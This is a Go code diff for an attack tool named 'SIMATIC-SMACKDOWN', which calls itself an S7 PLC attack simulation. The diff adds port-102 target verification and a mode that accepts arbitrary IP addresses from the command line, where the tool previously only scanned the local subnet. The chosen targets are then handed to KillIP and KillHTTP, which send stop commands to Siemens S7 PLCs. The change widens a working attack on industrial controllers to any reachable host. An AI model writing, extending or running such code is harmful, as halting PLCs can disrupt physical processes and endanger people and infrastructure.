@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net"
 	"net/http"
+	"os"
 	"strings"
 	"time"
 )
@@ -62,6 +63,23 @@ func ScanIP(ipList []string) []string {
 	}
 	fmt.Printf("[+] Scan complete. Found %d S7 PLCs\n", len(scannedIPs))
 	return scannedIPs
+}
+
+// VerifyTargets checks if provided IPs have port 102 open
+func VerifyTargets(targets []string) []string {
+	fmt.Printf("[*] Verifying target IPs for S7 PLCs on port 102...\n")
+	var validTargets []string
+	for _, ip := range targets {
+		target := ip + ":102"
+		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
+			fmt.Printf("[+] Confirmed S7 PLC at: %s\n", ip)
+			validTargets = append(validTargets, ip)
+			conn.Close()
+		} else {
+			fmt.Printf("[-] Target %s is not reachable on port 102\n", ip)
+		}
+	}
+	return validTargets
 }
 
 // KillIP sends a stop command to the devices at the scanned IPs.
@@ -136,31 +154,70 @@ func setHTTPHeaders(req *http.Request, ip string) {
 // 	}
 // }
 
+// ValidateIP checks if a string is a valid IP address
+func ValidateIP(ip string) bool {
+	return net.ParseIP(ip) != nil
+}
+
 func main() {
 	fmt.Println("=== SIMATIC-SMACKDOWN - S7 PLC Attack Simulation ===")
-	fmt.Println("[*] Starting attack simulation on test environment...")
 
-	ipAddr := GetIPAddr() + "/24"
-	if ipAddr == "/24" {
-		fmt.Println("[ERROR] No network interface found. Exiting.")
-		return
+	var targets []string
+
+	// Check if IP addresses were provided as arguments
+	if len(os.Args) > 1 {
+		fmt.Printf("[*] Target mode: Specific IPs provided\n")
+		// Validate provided IPs
+		for _, arg := range os.Args[1:] {
+			if ValidateIP(arg) {
+				targets = append(targets, arg)
+				fmt.Printf("[+] Added target: %s\n", arg)
+			} else {
+				fmt.Printf("[-] Invalid IP address: %s (skipping)\n", arg)
+			}
+		}
+
+		if len(targets) == 0 {
+			fmt.Println("[ERROR] No valid IP addresses provided. Exiting.")
+			fmt.Println("Usage: simatic_smackdown [ip1] [ip2] ...")
+			return
+		}
+
+		// Verify targets have port 102 open
+		targets = VerifyTargets(targets)
+		if len(targets) == 0 {
+			fmt.Println("[!] No targets are reachable on port 102. Exiting.")
+			return
+		}
+	} else {
+		// No arguments - perform network scan
+		fmt.Printf("[*] Target mode: Network scan\n")
+		fmt.Println("[*] No specific targets provided - scanning local network...")
+
+		ipAddr := GetIPAddr() + "/24"
+		if ipAddr == "/24" {
+			fmt.Println("[ERROR] No network interface found. Exiting.")
+			return
+		}
+
+		fmt.Printf("[*] Targeting subnet: %s\n", ipAddr)
+		ipList := GetNetwork(ipAddr)
+		if ipList == nil {
+			fmt.Println("[ERROR] Failed to generate IP list. Exiting.")
+			return
+		}
+
+		targets = ScanIP(ipList)
+		if len(targets) == 0 {
+			fmt.Println("[!] No S7 PLCs found on the network. Exiting.")
+			return
+		}
 	}
 
-	fmt.Printf("[*] Targeting subnet: %s\n", ipAddr)
-	ipList := GetNetwork(ipAddr)
-	if ipList == nil {
-		fmt.Println("[ERROR] Failed to generate IP list. Exiting.")
-		return
-	}
-
-	scannedIPs := ScanIP(ipList)
-	if len(scannedIPs) == 0 {
-		fmt.Println("[!] No S7 PLCs found on the network. Exiting.")
-		return
-	}
-
-	KillIP(scannedIPs)
-	KillHTTP(scannedIPs)
+	// Attack the targets
+	fmt.Printf("\n[*] Proceeding with attack on %d target(s)\n", len(targets))
+	KillIP(targets)
+	KillHTTP(targets)
 
 	// switch runtime.GOOS {
 	// case "linux":
@@ -172,5 +229,5 @@ func main() {
 	// }
 
 	fmt.Println("\n[*] Attack simulation complete.")
-	fmt.Printf("[*] Targeted %d PLCs in total\n", len(scannedIPs))
+	fmt.Printf("[*] Targeted %d PLCs in total\n", len(targets))
 }
